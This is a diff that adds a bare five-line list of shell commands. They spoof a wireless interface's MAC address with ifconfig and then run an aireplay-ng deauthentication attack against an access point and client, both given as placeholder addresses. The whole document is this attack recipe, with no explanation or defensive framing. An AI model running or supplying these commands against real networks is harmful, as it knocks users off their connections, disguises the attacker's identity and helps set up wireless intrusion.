@@ -1,0 +1,5 @@
+1-ifconfig
+2-ifconfig wlan0 down
+3-ifconfig wlan0 hw ether XX:XX:XX:XX:XX:XX
+4-ifconfig wlan0 up
+5-aireplay-ng -0 1 -a xx:xx:xx:xx:xx:xx -c yy:yy:yy:yy:yy:yy wlan0
